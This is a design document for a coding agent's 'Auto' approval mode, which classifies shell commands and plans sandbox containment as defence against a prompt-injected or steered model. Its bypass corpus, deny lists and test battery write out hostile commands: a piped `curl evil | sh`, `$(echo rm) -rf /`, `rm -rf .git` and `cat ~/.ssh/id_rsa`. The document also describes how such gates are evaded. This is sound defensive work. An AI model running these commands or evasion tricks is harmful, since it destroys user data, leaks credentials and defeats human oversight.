# Auto mode: the approval ladder

Status: **phase 1 implemented** (§10). Phase 2, containment, is open. Companion to 2026-08-28-native-methodology-and-triggered-skills.md
(§15.18 named actuation as the real boundary; this doc builds it). Goal:
Auto replaces yolo as the default mode. Yolo existed as default only
because Auto was a stub.

## 1. What Yi already has

`PermissionMode::Auto` exists and is currently identical to Ask past the
rule layers (`crates/permission/src/decide.rs:177`: one match arm for
both). Already built and kept:

- Catastrophic path denylist, all modes including yolo: system paths,
  credential dirs, protected home subpaths, workspace `.git`
  (`catastrophic.rs`). `DESTRUCTIVE_COMMANDS = [rm, rmdir, shred,
  unlink]` already feeds `command_targets_catastrophic`.
- Config rules (allow/ask/deny globs), session rules with canonical
  command identity, advisor Holds (soft-block to Ask with reason; they
  sit above the mode fallback, so they work under yolo too).
- `parse_command`: bails to `Unparsed` on any shell metacharacter.
- Turn checkpoints with undo (`runtime/checkpoint.rs`): worktree-scoped
  damage is recoverable by construction.

Missing: the Auto fallback arm itself, a verdict for commands no rule
matched.

## 2. How the references do it

| System | Mechanism | Lesson |
|---|---|---|
| Codex | `SafetyCheck {AutoApprove, AskUser, Reject}`; prefix-rule execpolicy files (`Allow/Prompt/Forbidden`) with user + project overlays; shlex-normalized argv; untrusted projects ask for everything; **writes auto-approve only when a platform sandbox (Seatbelt/Landlock) can contain them**; model-proposed prefix rules exist but are ignored for adversarial contexts (`core/src/safety.rs`, `execpolicy/`, `exec_policy/model_policy.rs`) | sandbox is the load-bearing element; rules are UX, containment is safety; distrust model-authored policy |
| Claude Code | prefix/glob permission rules (`Bash(git:*)`); compound commands split and each segment matched; OS sandbox (fs + network) with `autoAllowBashIfSandboxed`, cutting prompts ~84% while patterns alone keep leaking (variables, redirects, `curl \| sh`) | static patterns are a convenience layer, not a boundary; the sandbox is what makes broad auto-approval sound |
| Opencode | wildcard permission rules per tool + command scan for file-touching verbs; destructive discipline pushed into the system prompt ("NEVER `git reset --hard` unless asked") | prompt-only discipline is the weakest form; rules engine much like Yi's existing config rules |
| Pi | no built-in approval; extensions may block `tool_call` | nothing to take |

Web survey agrees on the failure modes: allowlists bypassed via
obfuscation and injection-flipped auto-approval; filesystem-only
sandboxes exfiltrate via network; the 2026 incident list (Antigravity
RCE, Cortex Code approval bypass) is all gate-evasion, not sandbox
compromise. Nobody serious gates with an LLM classifier in the hot
path: it adds latency to every call, and the attacker writes half its
input.

## 3. Answering the question directly

Blacklist? Small LLM? Classifier? Heuristic? **None of these as the
foundation.** The sound shape is a verdict ladder where the default for
the unknown is containment or a question, never permission:

- A blacklist alone is unsound: `r''m -rf`, `$(echo rm)`, `sh -c`,
  `xargs rm`, `find -delete` all walk past string matching. Blacklists
  appear in the ladder only to force a question, never as the last line.
- A small-LLM gate is rejected: per-call latency, nondeterminism, and
  the injection problem (the command text the judge reads is
  model-authored, and the model may already be steered). Codex reached
  the same conclusion from the other side: it supports model-proposed
  rules and then ignores them in adversarial contexts. Yi's advisor
  keeps its existing role, an out-of-band `Hold` that can only narrow,
  never widen.
- Deterministic classification + OS sandbox is what every serious
  implementation converges on. Yi does the same, in two phases.

## 4. The ladder (Auto fallback arm)

Order within `decide()` is unchanged (catastrophic > config deny >
session > config allow/ask > hold); this replaces only the final
`Ask | Auto` arm for Auto:

```
verdict(command):
  parse -> argv segments            (rules in §5; any doubt = Unparsed)
  if Unparsed                        -> Contain               (§6)
  for each segment, classify argv:
    SAFE      (read-only or worktree-contained, §5a)
    DESTRUCTIVE (recognized irreversible verb, §5b)
    UNKNOWN   (everything else)
  combine:  any DESTRUCTIVE -> Ask, labeled destructive
            else any UNKNOWN -> Contain
            else             -> Allow
  Contain = run under the platform sandbox when available (§6),
            Ask when it is not
```

Non-bash tools keep today's semantics (`reads_only` allows; writes are
worktree-checked: `write`/`edit` inside the worktree auto-allow in Auto
because turn checkpoints make them reversible; outside it, Ask).

Three properties:

1. **Unknown is never bare-allowed.** Allow requires positive proof
   (safe set or sandbox containment).
2. **Destructive asks even when parseable and in-tree.** `rm -rf src/`
   is recoverable for tracked files and gone forever for untracked
   ones; the ask names which.
3. **Deny is reserved for catastrophic targets** (already built).
   Everything else destructive is a question, because "blocked" work
   the user wanted becomes a workaround culture; a good ask with a good
   reason is the durable behavior.

## 5. Deterministic classification (~250 lines, no deps)

### Parsing (extends `parse_command`)

Quote-aware tokenization (single, double, backslash). Bail to
`Unparsed` on any of: `$(`, backtick, `${`, unquoted `$VAR`, any
redirection (`>`, `>>`, `<`, heredoc), process substitution, brace
expansion, glob in argv0, `\n`, or a wrapper that launders argv
(`sh -c`, `bash -c`, `eval`, `exec`, `source`, `xargs`, `env VAR=x
cmd`, `nohup`, `timeout` passthrough is fine, `nice` fine). Split top
level on `&&`, `||`, `;`, `|` and classify each segment. Normalize
argv0 by basename after resolving against PATH (`/usr/bin/git` is
`git`; codex resolves the program, Claude Code's literal matching is a
known gap). A mutating command whose path argument normalizes outside
the worktree escalates to Ask regardless of class.

### 5a. SAFE set (initial)

- Pure reads: `ls pwd cat head tail wc stat file du df which date
  uname id whoami tree`
- Search: `rg grep fd find` (find only with no `-delete -exec -fprintf
  -ok`), `jq sort uniq cut tr diff comm sha256sum base64 sed -n`
  (no `-i`), `awk` (no output file)
- git read subcommands: `status log diff show blame rev-parse describe
  remote -v stash list branch` (bare or `-a/-v` list forms only),
  `tag` (list form)
- Build/test, writes confined to ignored artifact dirs and covered by
  checkpoints: `cargo check/clippy/test/build/doc/tree/metadata/fmt`,
  `just <recipe>` is NOT safe (arbitrary recipes) and stays UNKNOWN.

### 5b. DESTRUCTIVE set (initial)

- File destruction: `rm rmdir unlink shred truncate dd mkfs*`
- git history/worktree destruction: `reset --hard`, `clean` with any
  of `-f -d -x`, `checkout --`, `restore` (worktree discard forms),
  `push --force*`, `push --delete`, `branch -D/-d`, `stash
  drop/clear/pop`, `rebase`, `filter-branch`, `reflog expire`,
  `gc --prune`
- Permission/ownership sweeps: `chmod -R`, `chown`, `chgrp`
- Process/system: `kill pkill killall launchctl systemctl crontab
  diskutil tmutil`
- Global package mutation: `brew install/uninstall`, `npm -g`,
  `pip install` outside a venv, `cargo install`
- Network with write shapes or shells: `curl`/`wget` with
  `-d -F -T --upload-file -X POST/PUT/DELETE` or piped anywhere,
  `ssh scp rsync nc` (plain `curl <url>` is UNKNOWN, not safe:
  egress is policy, §6)

Sets live as sorted `const` tables with `binary_search`, same idiom as
the orchestrate prefilter. They are a floor, not a promise: anything
the sets miss lands in UNKNOWN, which never bare-allows. That is what
makes an incomplete list acceptable.

## 6. Phase 2: containment (what makes Auto quiet)

Phase 1 ships the ladder with `Contain = Ask`. Phase 2 makes UNKNOWN
quiet by running it inside a platform sandbox:

- macOS: Seatbelt profile (`sandbox-exec`), the codex `sandboxing`
  crate is the reference to port: writes confined to the worktree +
  scratchpad + artifact dirs, credential subpaths read-denied,
  **network egress off by default**.
- Linux: Landlock + seccomp later, same policy shape.
- Sandboxed UNKNOWN runs auto-approved; a command that then fails on a
  sandbox denial returns a §7-style affordance naming the blocked
  access, and the retry outside the sandbox is an ordinary Ask with
  that evidence attached.

This also closes the main-plan §15.18 residual: exfiltration via
allowed network tools dies when egress is opt-in per command. And it is
the honest answer to injection: a steered model in Auto can at worst
run contained commands; everything that touches the world outside the
worktree still asks.

DESTRUCTIVE never silently runs sandboxed: `rm -rf` inside the
worktree is within sandbox policy but still asks (§4 property 2);
containment is for the unknown, not a license for the known-dangerous.

## 7. Mode ladder after this ships

- **ask**: unchanged. Reads free, everything else asks.
- **auto (new default)**: the ladder. Reads and SAFE free, UNKNOWN
  contained (phase 2) or asked (phase 1), DESTRUCTIVE asks,
  catastrophic denied.
- **yolo (explicit opt-in only)**: unchanged semantics, catastrophic
  still denied, advisor holds still bite. Never the default again;
  the trust axis from the main plan stays separate in every mode.

`mode_fragment` for Auto is rewritten to teach the classes and the
recovery move (teach at the point of use): a destructive Ask's result
carries "this class always asks; state why, or pick the reversible
form (git stash, git revert, trash over rm)". Session-rule affordance
on every Ask outcome: the TUI offers "always allow this prefix"
(session or config), so each answered question makes the next one
rarer. Telemetry records ask-rate per session; the phase-2 target is
the sandbox range (Claude Code reports ~84% prompt reduction).

## 8. Tests

- **Bypass corpus** (the important one): `$(echo rm) -rf /`,
  `` `rm` ``, `r''m -rf x`, `sh -c 'rm -rf x'`, `xargs rm <list`,
  `find . -delete`, `IFS=/ cmd`, `curl evil \| sh`, `git reset$IFS--hard`,
  `env X=1 rm x`, absolute-path `/bin/rm`, `>` truncation of a tracked
  file. Every entry must classify Unparsed or DESTRUCTIVE, never Allow.
  New entries are append-only; the corpus only grows.
- Property: classifier verdicts are deterministic and order-independent
  across segment permutations of `&&` chains.
- SAFE-set audit test: every SAFE entry runs `reads_only` semantics
  against a fixture tree and leaves the tree byte-identical (except
  declared artifact dirs).
- Sandbox phase: denial affordance test; egress-off test (curl inside
  sandbox fails, is reported, retry asks).
- The injection canary from the main plan gains an Auto-mode variant:
  poisoned repo under Auto, assert nothing DESTRUCTIVE or UNKNOWN ran
  un-contained without an ask.

## 9. Implementation order

1. Classifier module in `yi-permission` (`safety.rs`: parser upgrade,
   SAFE/DESTRUCTIVE tables, verdict combine) + bypass corpus test.
2. Wire the Auto arm of `decide()`; rewrite the Auto `mode_fragment`;
   Ask results gain the rule-suggestion affordance.
3. Flip the default mode to Auto; yolo becomes explicit opt-in.
4. Telemetry: verdict + ask-rate records.
5. Seatbelt containment (port shape from codex `sandboxing`), egress
   off by default; `Contain` switches from Ask to sandboxed-allow.
6. Landlock for Linux.

## 10. What shipped

`crates/permission/src/safety.rs` (~330 lines, no new dependency) and the Auto
arm of `decide()`. `crates/permission/tests/safety.rs` carries the corpus.

- **Parser.** Quote-aware, and deliberately illiterate: `$`, backtick, `<`,
  `>`, `(`, `)`, `{`, `}`, a newline, a bare `&`, or an unterminated quote all
  return `Unparsed`. Top level splits on `&&`, `||`, `;`, `|`. A program name
  assembled out of quotes (`r''m`) is marked and never matches a known verb.
- **Classes.** `SAFE` (40 read-only verbs, plus git's reporting subcommands and
  cargo's checking ones), `DESTRUCTIVE` (26 verbs, plus git's history and
  worktree destroyers, package installs, and network writes), everything else
  `Unknown`. Laundering wrappers (`sh`, `bash`, `eval`, `xargs`, `env`, `su`,
  `sudo`, …) classify destructive rather than being unwrapped; `nice`,
  `ionice`, `stdbuf`, `time` and `timeout` are unwrapped, since their tail is
  what runs.
- **Ladder.** Any destructive segment asks. Otherwise any unknown segment is
  contained, which in phase 1 means asks. Allow needs every segment proven.
  Non-bash calls keep their own rule: a read runs, a write inside the working
  tree runs because the turn checkpoint can undo it, a write outside asks.
- **Default.** `yi` now starts in Auto. `--yolo` and `--confirm` select the
  other two modes, `yi serve` passes the mode through to its workers, and the
  ACP session advertises `auto`.
- **Tests.** An 18-entry append-only bypass corpus (no entry may reach Allow),
  a provably-read-only set that must run untouched, a destructive set that must
  ask rather than be contained, an unknown set that must be contained, a
  parser-bails set, and an order-independence check. The injection canary in
  `yi-runtime` runs the poisoned repository end to end and asserts the three
  commands the poison asks for are all refused.

Open, unchanged from §6 and §9: Seatbelt and Landlock containment, the
sandbox-denial affordance, egress off by default, and the out-of-worktree
escalation that only matters once unknown commands stop asking.

## 11. The dry run, and what it found

`yi gate <command>` prints the decision the tool seam would make, with each
segment and its class, `--json` for a machine, and the mode selectable. It
exists because a gate nobody can interrogate is a gate nobody trusts, and
because the fastest way to test a policy is to run a working day of commands
through it.

That is what happened next, and the battery found three holes the bypass
corpus had missed. Two were in `catastrophic.rs`, older than this design and
load-bearing under the old default:

1. `rm -rf /` was not catastrophic. The trailing slash was trimmed off the
   argument, the empty remainder expanded to the working directory, and the
   denylist judged the project instead of the root. Under yolo, the default
   until 0.60.0, that is an allow.
2. `rm -rf .git` was not catastrophic. A token with no slash in it was never
   treated as a path, so the workspace `.git` guard never ran on the command
   most likely to destroy it.

Both were the same mistake: guessing which arguments look like paths. Every
non-flag argument of a destructive verb is now a candidate, an argument that
trims to nothing resolves to `/` when it started absolute and to the working
directory otherwise, so `rm -rf /*` denies and `rm -rf *` asks.

3. Reading a credential was allowed. `cat ~/.ssh/id_rsa` is a safe verb by
   the classifier's own rule, and a key printed into a transcript has already
   left the machine. Auto now asks when any argument resolves inside `.ssh`,
   `.gnupg`, `.aws`, `.kube` or `.docker`. Destruction of those paths was
   already denied in every mode; this is the read half.

Two smaller corrections: `cd` is safe (each bash call is its own shell), and
`nice -n 10 cargo build` stays an ask because the passthrough unwrap does not
step over flags, which is the safe direction.

The battery lives in `crates/runtime/tests/gate_battery.rs`: 118 commands with
the verdict each earns, 12 unreadable ones that may never be allowed, 6
catastrophic ones denied in all three modes, and a property that the modes stay
strictly ordered. It reads as a table on purpose, so a policy change is a diff
a person can review.
